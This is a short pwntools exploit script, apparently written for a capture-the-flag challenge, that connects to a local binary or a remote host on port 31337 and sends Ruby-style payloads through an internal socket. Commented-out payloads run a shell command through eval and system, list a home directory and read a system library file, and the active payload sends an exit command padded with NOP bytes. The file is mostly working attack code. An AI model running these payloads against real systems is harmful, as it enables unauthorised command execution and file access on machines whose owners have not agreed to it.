#!/usr/bin/env python
from pwn import *
import sys
import time

context.log_level = 'debug'

if len(sys.argv) >= 2 and sys.argv[1] == 'r':
    print("remote...")
    conn = remote('54.65.72.116', 31337)
else:
    print("local...")
    conn = process('./start')

def send(code):
    conn.sendafter('> ', code)
    # conn.sendline(code)


if __name__ == '__main__':
    print('start')
#    p = 'z = Sock.new("127.0.0.1", 31338); z.sendline(eval("system(\'ls\')"));z.recv()'
#    p = 's = Sock.new \'127.0.0.1\', 31338;s.sendline(puts Dir.glob(\'/home/start/*\', File::FNM_DOTMATCH));p s.recv(1000);'
#    p = 's = Sock.new \'127.0.0.1\', 31338;s.sendline(eval("f=File.open(\'/usr/lib/x86_64-linux-gnu/libstdc++.so.6\');s=f.read;puts s;"));p s.recv(1000);'
    p = '\
        s = Sock.new \'127.0.0.1\', 31338;\
        s.send("exit\n"+"\x90"*19);\
        p s.recv(1000);\
        p s.recv(1000);\
        '
    send(p)
    time.sleep(0.5)
    conn.recv()
